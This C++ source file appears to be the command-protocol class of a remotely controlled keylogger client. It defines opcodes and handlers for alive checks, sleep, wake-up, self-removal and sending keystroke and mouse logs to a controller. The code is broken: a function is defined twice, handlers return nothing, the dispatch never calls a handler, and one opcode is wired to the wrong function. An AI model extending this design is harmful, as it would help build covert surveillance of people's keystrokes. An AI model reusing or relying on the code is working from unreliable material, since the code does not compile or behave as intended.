#include "stdafx.h"
#include "Protocole.h"
#include <vector>

Protocole::Protocole()
{
	typedef int (Protocole::*func)();

	this->_op_code = WAIT_OPC;
	this->_tab[WAY] = &whoAreYou;
	this->_tab[IAM] = &iAm;
	this->_tab[QALIVE] = &queryAlive;
	this->_tab[AALIVE] = &answerAlive;
	this->_tab[QUIT] = &quit;
	this->_tab[SLEEP] = &sleep;
	this->_tab[WAKEUP] = &wakeUp;
	this->_tab[REMOVE] = &remove;
	this->_tab[SENDKEYLOG] = &sendKeyLog;
	this->_tab[TAKEDATNAME] = &takeDatName;
	this->_tab[CMDNOTFOUND] = &cmdNotFound;
	this->_tab[OP_FAIL] = &sendMouseLog;
	this->_task = NOTHING;
}


Protocole::~Protocole()
{
}

int	Protocole::whoAreYou()
{
}

int		Protocole::analyze(const std::string buff)
{
	this->_buffer = buff;
	if (this->_op_code == WAIT_OPC)
	{
		this->_op_code = std::stoi(buff);
		return (0);
	}
	return (1);			
}

int		Protocole::doSmth()
{
	this->_op_code = OPC_DONE;
	this->_tab[this->_op_code];
}

int		Protocole::whoAreYou() {  }

int		Protocole::iAm() {
	//	this->_smsg.code = OP_FAIL;
	//	this->_smsg.data = NULL;
	//	this->_smsg.nbmsg = 0;
	//	this->_smsg.size = 0;
	//	this->_smsg.timestamps = 0000140000; // date/heure}
	//	this->_task = NOTHING;
	this->_task = SEND;
}

int		Protocole::queryAlive(){ }

int		Protocole::answerAlive() {
	this->_smsg.code = 4;
	this->_smsg.data = NULL;
	this->_smsg.nbmsg = 0;
	this->_smsg.size = 0;
	this->_smsg.timestamps = 0000140000; // date/heure
	this->_task = SEND;
}

int		Protocole::quit() {
	this->_smsg.code = 4;
	this->_smsg.data = NULL;
	this->_smsg.nbmsg = 0;
	this->_smsg.size = 0;
	this->_smsg.timestamps = 0000140000; // date/heure}
	this->_task = QUIT;
}
int		Protocole::sleep() { 
	this->_task = SLEEP;
}

int		Protocole::wakeUp() { 
	this->_task = WAKEUP;
}

int		Protocole::remove() { 
	this->_task = REMOVE;
}

int		Protocole::sendKeyLog() { 
	// Parsing forever
	//	this->_smsg.code = OP_FAIL;
	//	this->_smsg.data = NULL;
	//	this->_smsg.nbmsg = 0;
	//	this->_smsg.size = 0;
	//	this->_smsg.timestamps = 0000140000; // date/heure}
	//	this->_task = NOTHING;
	this->_task = SEND;
}

int		Protocole::sendMouseLog() { 
	// Parsing forever
	//	this->_smsg.code = OP_FAIL;
	//	this->_smsg.data = NULL;
	//	this->_smsg.nbmsg = 0;
	//	this->_smsg.size = 0;
	//	this->_smsg.timestamps = 0000140000; // date/heure}
	//	this->_task = NOTHING;
	this->_task = SEND;
}

int		Protocole::takeDatName() { 
	this->_id = std::stoi(this->_buffer);
	this->_task = NOTHING;
}

int		Protocole::cmdNotFound() { 
	this->_smsg.code = OP_FAIL;
	this->_smsg.data = NULL;
	this->_smsg.nbmsg = 0;
	this->_smsg.size = 0;
	this->_smsg.timestamps = 0000140000; // date/heure}
	this->_task = NOTHING;
}

t_msg	Protocole::getStruct()
{
	return (this->_smsg);
}

std::string Protocole::getMsg()
{
}

void	Protocole::setStruct(const t_msg tab)
{
	this->_smsg = tab;
}